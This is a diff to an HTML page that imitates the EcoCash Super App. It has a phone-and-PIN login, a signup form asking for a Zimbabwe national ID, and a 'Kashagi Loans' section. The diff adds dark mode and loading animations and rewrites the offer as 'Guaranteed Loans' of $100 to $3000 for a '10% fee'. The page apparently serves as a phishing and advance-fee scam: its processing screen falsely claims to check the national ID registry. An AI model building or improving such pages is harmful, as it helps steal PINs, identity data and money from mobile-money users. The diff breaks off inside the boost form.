@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,9 +9,10 @@
     <!-- FontAwesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts Inter -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
+            darkMode: 'class',
             theme: {
                 extend: {
                     colors: {
@@ -56,46 +57,63 @@
         .banner-float {
             animation: float-banner 4s ease-in-out infinite;
         }
+        /* Loading Skeleton Animation */
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: calc(200px + 100%) 0; }
+        }
+        .skeleton {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200px 100%;
+            animation: shimmer 1.5s infinite;
+        }
+        .dark .skeleton {
+            background: linear-gradient(90deg, #2d3748 25%, #4a5568 50%, #2d3748 75%);
+            background-size: 200px 100%;
+        }
     </style>
 </head>
-<body class="bg-gray-100 font-sans antialiased text-gray-800 flex justify-center min-h-screen">
+<body class="bg-gray-100 dark:bg-gray-900 font-sans antialiased text-gray-800 dark:text-gray-100 flex justify-center min-h-screen transition-colors duration-300">
 
     <!-- Mobile Frame / Container -->
-    <div class="w-full max-w-md bg-white min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden">
+    <div class="w-full max-w-md bg-white dark:bg-gray-800 min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden transition-colors duration-300">
 
         <!-- HEADER & NAVIGATION -->
-        <header class="bg-white border-b border-gray-200 sticky top-0 z-40">
+        <header class="bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 sticky top-0 z-40 transition-colors duration-300">
             <div id="top-nav-bar" class="bg-ecoblue text-white text-xs py-2 px-4 flex justify-between items-center font-medium">
                 <!-- Real EcoCash Super App Logo Icon Badge -->
                 <div class="flex items-center space-x-2 bg-white text-ecoblue px-2 py-1 rounded shadow-sm">
                     <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="EcoCash" class="w-4 h-4 object-contain rounded-full">
                     <span class="font-extrabold tracking-tighter text-xs">EcoCash <span class="text-ecored">Super App</span></span>
                 </div>
-                <div class="space-x-3">
-                    <button onclick="switchTab('contact')" class="hover:underline transition">Contact Us</button>
-                    <button onclick="switchTab('contact')" class="hover:underline transition">Agent Locator</button>
+                <div class="flex items-center space-x-3">
+                    <button onclick="switchTab('contact')" class="hover:underline transition">Help Center</button>
+                    <!-- Dark Mode Toggle Button -->
+                    <button onclick="toggleDarkMode()" class="p-1.5 rounded-full bg-white/20 hover:bg-white/30 transition text-white" title="Toggle Dark Mode">
+                        <i id="dark-mode-icon" class="fa-solid fa-moon text-xs"></i>
+                    </button>
                 </div>
             </div>
 
-            <div class="px-4 py-3 flex justify-between items-center bg-white">
+            <div class="px-4 py-3 flex justify-between items-center bg-white dark:bg-gray-800 transition-colors duration-300">
                 <div class="cursor-pointer flex items-center space-x-2" onclick="switchTab('login')">
                     <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
                 </div>
 
-                <button id="menu-btn" onclick="toggleMenu()" class="p-2 border border-gray-200 rounded-md text-gray-600 hover:bg-gray-50 focus:outline-none">
+                <button id="menu-btn" onclick="toggleMenu()" class="p-2 border border-gray-200 dark:border-gray-700 rounded-md text-gray-600 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700 focus:outline-none transition">
                     <i class="fa-solid fa-bars text-xl"></i>
                 </button>
             </div>
 
-            <div id="nav-dropdown" class="hidden bg-white border-t border-gray-100 px-6 py-3 space-y-3 shadow-md">
+            <div id="nav-dropdown" class="hidden bg-white dark:bg-gray-800 border-t border-gray-100 dark:border-gray-700 px-6 py-3 space-y-3 shadow-md transition-colors duration-300">
                 <div>
-                    <button onclick="switchTab('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Log In</button>
+                    <button onclick="switchTab('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Sign Up</button>
+                    <button onclick="switchTab('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Contact Us</button>
+                    <button onclick="switchTab('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
                 </div>
             </div>
         </header>
@@ -113,12 +131,12 @@
             <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
             <section id="view-login" class="flex-1 flex flex-col justify-between">
                 <div class="p-6">
-                    <h2 class="text-center text-xl font-bold text-gray-700 mb-6">Login</h2>
+                    <h2 class="text-center text-xl font-bold text-gray-700 dark:text-gray-200 mb-6">Login</h2>
 
                     <!-- Phone Input -->
                     <div class="mb-6">
-                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue">
-                            <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 pr-2">
+                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue dark:bg-gray-700 dark:border-gray-600">
+                            <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 dark:border-gray-600 pr-2">
                                 <svg class="w-6 h-4 rounded-sm border border-gray-200" viewBox="0 0 60 30" xmlns="http://www.w3.org/2000/svg">
                                     <rect width="60" height="30" fill="#319200"/>
                                     <rect y="4.28" width="60" height="21.44" fill="#ffd200"/>
@@ -128,34 +146,34 @@
                                     <polygon points="0,0 20,15 0,30" fill="none" stroke="#000" stroke-width="0.5"/>
                                     <polygon points="6,15 13,10 10,18 16,13 8,13" fill="#de2010"/>
                                 </svg>
-                                <span class="text-gray-700 font-semibold text-sm">+263</span>
+                                <span class="text-gray-700 dark:text-gray-200 font-semibold text-sm">+263</span>
                             </div>
-                            <input type="tel" id="login-phone" placeholder="712345678" maxlength="9" class="w-full text-gray-800 font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <input type="tel" id="login-phone" placeholder="712345678" maxlength="9" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
                         </div>
                     </div>
 
                     <!-- PIN Section -->
                     <div class="text-center mb-6">
-                        <p class="text-xs text-gray-500 font-medium mb-3">Enter your PIN</p>
+                        <p class="text-xs text-gray-500 dark:text-gray-400 font-medium mb-3">Enter your PIN</p>
                         
                         <div class="flex justify-center items-center space-x-3 relative max-w-xs mx-auto">
-                            <input type="password" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
+                            <input type="password" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
 
-                            <button type="button" onclick="togglePinVisibility()" class="ml-2 text-gray-600 hover:text-ecoblue focus:outline-none">
+                            <button type="button" onclick="togglePinVisibility()" class="ml-2 text-gray-600 dark:text-gray-300 hover:text-ecoblue focus:outline-none">
                                 <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
                             </button>
                         </div>
 
                         <div class="mt-2">
-                            <a href="#" class="text-xs text-gray-500 hover:underline">Forgot PIN?</a>
+                            <a href="#" class="text-xs text-gray-500 dark:text-gray-400 hover:underline">Forgot PIN?</a>
                         </div>
                     </div>
 
                     <!-- LOGIN BUTTON -->
-                    <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
+                    <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
                         LOGIN
                     </button>
                 </div>
@@ -187,32 +205,32 @@
 
 
             <!-- ================= VIEW 2: SIGN UP SCREEN ================= -->
-            <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
-                <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
+            <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
+                <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6 transition-colors">
                     <div class="flex items-center justify-between mb-4">
                         <button onclick="switchTab('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back to Login</span>
                         </button>
-                        <h2 class="text-xl font-bold text-gray-800">Sign up</h2>
+                        <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Sign up</h2>
                     </div>
 
-                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700">
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700 dark:text-gray-300">
                         <!-- First Name -->
                         <div>
                             <label class="block font-medium mb-1">First Name <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                         </div>
 
                         <!-- Surname -->
                         <div>
                             <label class="block font-medium mb-1">Surname <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                         </div>
 
                         <!-- Country Select -->
                         <div>
                             <label class="block font-medium mb-1">Country <span class="text-red-500">*</span></label>
-                            <select id="signup-country" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600" onchange="validateSignupForm()">
+                            <select id="signup-country" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none bg-white focus:border-ecoblue text-gray-600 dark:text-gray-300" onchange="validateSignupForm()">
                                 <option value="">---Select country---</option>
                                 <option value="Zimbabwe">Zimbabwe</option>
                                 <option value="South Africa">South Africa</option>
@@ -223,32 +241,32 @@
                         <!-- Username (Mobile Number) -->
                         <div>
                             <label class="block font-medium mb-1">Username (Mobile number) <span class="text-red-500">*</span></label>
-                            <div class="bg-gray-100 text-gray-500 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200">
+                            <div class="bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200 dark:border-gray-600">
                                 263
                             </div>
-                            <input type="tel" id="signup-phone" placeholder="Mobile Number" maxlength="9" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <input type="tel" id="signup-phone" placeholder="Mobile Number" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                         </div>
 
                         <!-- Email -->
                         <div>
                             <label class="block font-medium mb-1">Email <span class="text-red-500">*</span></label>
-                            <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                         </div>
 
                         <!-- National ID (Strictly Zimbabwe ID format) -->
                         <div>
                             <label class="block font-medium mb-1">Zimbabwe National Id <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
+                            <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
                             <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
                         </div>
 
                         <!-- Password -->
                         <div>
                             <label class="block font-medium mb-1">
-                                New Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500">(Min 8 chars, 1 letter, 1 number)</span>
+                                New Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500 dark:text-gray-400">(Min 8 chars, 1 letter, 1 number)</span>
                             </label>
                             <div class="relative">
-                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 rounded-md p-2.5 pr-8 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 pr-8 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
                                 <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-3 text-gray-500">
                                     <i id="password-eye-icon" class="fa-regular fa-eye"></i>
                                 </button>
@@ -274,20 +292,20 @@
                         <div>
                             <label class="block font-medium mb-1">Birthday <span class="text-red-500">*</span></label>
                             <div class="grid grid-cols-3 gap-2">
-                                <select id="b-day" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                <select id="b-day" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
                                     <option value="">Day</option>
                                     <script>
                                         for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
                                     </script>
                                 </select>
-                                <select id="b-month" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                <select id="b-month" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
                                     <option value="">Month</option>
                                     <option value="January">January</option><option value="February">February</option><option value="March">March</option>
                                     <option value="April">April</option><option value="May">May</option><option value="June">June</option>
                                     <option value="July">July</option><option value="August">August</option><option value="September">September</option>
                                     <option value="October">October</option><option value="November">November</option><option value="December">December</option>
                                 </select>
-                                <select id="b-year" class="border border-gray-200 rounded-md p-2 text-xs text-gray-600 outline-none bg-white" onchange="validateSignupForm()">
+                                <select id="b-year" class="border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs text-gray-600 dark:text-gray-300 outline-none bg-white" onchange="validateSignupForm()">
                                     <option value="">Year</option>
                                     <script>
                                         for(let i=2008; i>=1940; i--) document.write(`<option value="${i}">${i}</option>`);
@@ -299,31 +317,31 @@
                         <!-- Terms Checkbox -->
                         <div class="flex items-start space-x-2 pt-2">
                             <input type="checkbox" id="terms" class="mt-0.5 rounded text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
-                            <label for="terms" class="text-xs text-gray-600 leading-tight cursor-pointer">
+                            <label for="terms" class="text-xs text-gray-600 dark:text-gray-400 leading-tight cursor-pointer">
                                 By clicking Sign Up, you agree to our <a href="#" class="text-blue-500 hover:underline">Terms, Data Policy and Cookie Policy</a>.
                             </label>
                         </div>
 
                         <!-- Submit Buttons -->
                         <div class="pt-4 space-y-3">
-                            <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
+                            <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
                                 SIGN UP
                             </button>
-                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 transition">
+                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
                                 LOGIN
                             </button>
                         </div>
                     </form>
                 </div>
 
-                <div class="text-center py-4 text-xs font-semibold text-gray-600">
+                <div class="text-center py-4 text-xs font-semibold text-gray-600 dark:text-gray-400">
                     ©2026 Ecocash
                 </div>
             </section>
 
 
             <!-- ================= VIEW 3: KASHAGI LOANS PORTAL & OPTIONS ================= -->
-            <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
+            <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <!-- Client Profile Banner with Smart Card Graphic -->
                     <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-4 relative overflow-hidden">
@@ -366,14 +384,14 @@
                     </div>
 
                     <div class="text-center mb-4">
-                        <span class="bg-green-100 text-green-800 text-[10px] font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">Super App Active Portal</span>
-                        <h2 class="text-base font-extrabold text-gray-800 mt-1.5">Qualify for Kashagi Loans Today</h2>
-                        <p class="text-[11px] text-gray-500">Select your preferred credit service below</p>
+                        <span class="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200 text-[10px] font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">Guaranteed Loans • No Guarantor Needed</span>
+                        <h2 class="text-base font-extrabold text-gray-800 dark:text-gray-100 mt-1.5">Qualify for Kashagi Loans Today</h2>
+                        <p class="text-[11px] text-gray-500 dark:text-gray-400">Select your preferred credit service below</p>
                     </div>
 
                     <!-- Visual Cards for Services -->
                     <div class="space-y-3">
-                        <div onclick="switchTab('boost-form')" class="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
+                        <div onclick="switchTab('boost-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> <span>Instant Credit Boost</span></span>
@@ -381,23 +399,23 @@
                             </div>
                             <div class="p-3 flex items-center justify-between">
                                 <div>
-                                    <h4 class="font-bold text-sm text-gray-800 group-hover:text-ecoblue">Boost My Kashagi Loans</h4>
-                                    <p class="text-[11px] text-gray-500">Upgrade existing credit limit instantly</p>
+                                    <h4 class="font-bold text-sm text-gray-800 dark:text-gray-100 group-hover:text-ecoblue">Boost My Kashagi Loans</h4>
+                                    <p class="text-[11px] text-gray-500 dark:text-gray-400">Upgrade existing credit limit instantly</p>
                                 </div>
                                 <i class="fa-solid fa-chevron-right text-xs text-gray-400"></i>
                             </div>
                         </div>
 
-                        <div onclick="switchTab('apply-form')" class="bg-white rounded-xl border border-gray-200 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
+                        <div onclick="switchTab('apply-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
-                                    <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-file-invoice-dollar text-green-400"></i> <span>Full Zimbabwe Registration</span></span>
+                                    <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-file-invoice-dollar text-green-400"></i> <span>Full Zimbabwe Registration ($100 - $3000)</span></span>
                                 </div>
                             </div>
                             <div class="p-3 flex items-center justify-between">
                                 <div>
-                                    <h4 class="font-bold text-sm text-gray-800 group-hover:text-supergreen">Apply / Register Kashagi Loan</h4>
-                                    <p class="text-[11px] text-gray-500">New loan application with 10% collateral</p>
+                                    <h4 class="font-bold text-sm text-gray-800 dark:text-gray-100 group-hover:text-supergreen">Apply / Register Kashagi Loan</h4>
+                                    <p class="text-[11px] text-gray-500 dark:text-gray-400">Choose tiers from $100 to $3000 (10% fee)</p>
                                 </div>
                                 <i class="fa-solid fa-chevron-right text-xs text-gray-400"></i>
                             </div>
@@ -405,27 +423,33 @@
                     </div>
                 </div>
 
-                <div class="text-center py-3 text-xs font-semibold text-gray-600">
+                <div class="text-center py-3 text-xs font-semibold text-gray-600 dark:text-gray-400">
                     ©2026 EcoCash Super App
                 </div>
             </section>
 
 
-            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN (5s Cycle with Tick) ================= -->
-            <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col items-center justify-center text-center">
-                <div class="bg-white rounded-2xl p-8 shadow-lg border border-gray-100 max-w-xs w-full space-y-6">
+            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN (Loading Skeleton & State) ================= -->
+            <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col items-center justify-center text-center">
+                <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-lg border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6">
                     <div id="process-spinner-container" class="relative w-20 h-20 mx-auto flex items-center justify-center">
-                        <div class="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
+                        <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
                         <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
                         <i id="process-icon" class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
                     </div>
 
                     <div class="space-y-2">
-                        <h3 id="process-title" class="font-extrabold text-base text-gray-800">Validating Details & Transactions</h3>
-                        <p id="process-subtitle" class="text-xs text-gray-500">Analyzing your last 6 months transactions and credentials...</p>
+                        <h3 id="process-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Validating Details & Transactions</h3>
+                        <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and credentials...</p>
                     </div>
 
-                    <div class="bg-gray-50 p-3 rounded-lg border border-gray-200 text-left text-[11px] space-y-1 text-gray-600">
+                    <!-- Loading Skeletons -->
+                    <div class="space-y-2 pt-2">
+                        <div class="h-4 w-full skeleton rounded"></div>
+                        <div class="h-4 w-3/4 skeleton rounded"></div>
+                    </div>
+
+                    <div class="bg-gray-50 dark:bg-gray-700 p-3 rounded-lg border border-gray-200 dark:border-gray-600 text-left text-[11px] space-y-1 text-gray-600 dark:text-gray-300">
                         <div class="flex items-center space-x-2">
                             <i class="fa-solid fa-check text-green-600"></i>
                             <span>Checking Zimbabwe National ID Registry</span>
@@ -436,7 +460,7 @@
                         </div>
                         <div class="flex items-center space-x-2">
                             <i class="fa-solid fa-check text-green-600"></i>
-                            <span>Validating Credit Eligibility</span>
+                            <span>Validating Guaranteed Loan Eligibility</span>
                         </div>
                     </div>
                 </div>
@@ -444,42 +468,42 @@
 
 
             <!-- ================= VIEW 5: BOOST MY KASHAGI LOANS FORM ================= -->
-            <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
-                <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
+            <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
+                <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6">
                     <div class="flex items-center justify-between mb-4">
                         <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
-                        <h2 class="text-base font-bold text-gray-800">Boost Kashagi Requirements</h2>
+                        <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Boost Kashagi Requirements</h2>
                     </div>
 
-                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700">
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700 dark:text-gray-300">
                         <div>
                             <label class="block font-medium mb-1">1. Full Names <span class="text-red-500">*</span></label>
-                            <input type="text" id="boost-name" placeholder="Full Names as per ID" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                            <input type="text" id="boost-name" placeholder="Full Names as per ID" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
                         </div>
 
                         <div>
                             <label class="block font-medium mb-1">2. Phone Number (Starting with 7) <span class="text-red-500">*</span></label>
-                            <div class="flex items-center border border-gray-200 rounded-md overflow-hidden focus-within:border-ecoblue">
-                                <span class="bg-gray-100 px-3 py-2.5 text-gray-600 font-semibold text-sm border-r border-gray-200">+263</span>
-                                <input type="tel" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none" oninput="validateBoostForm()">
+                            <div class="flex items-center border border-gray-200 dark:border-gray-700 dark:bg-gray-700 rounded-md overflow-hidden focus-within:border-ecoblue">
+                                <span class="bg-gray-100 dark:bg-gray-600 px-3 py-2.5 text-gray-600 dark:text-gray-200 font-semibold text-sm border-r border-gray-200 dark:border-gray-600">+263</span>
+                                <input type="tel" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
                             </div>
                         </div>
 
                         <div>
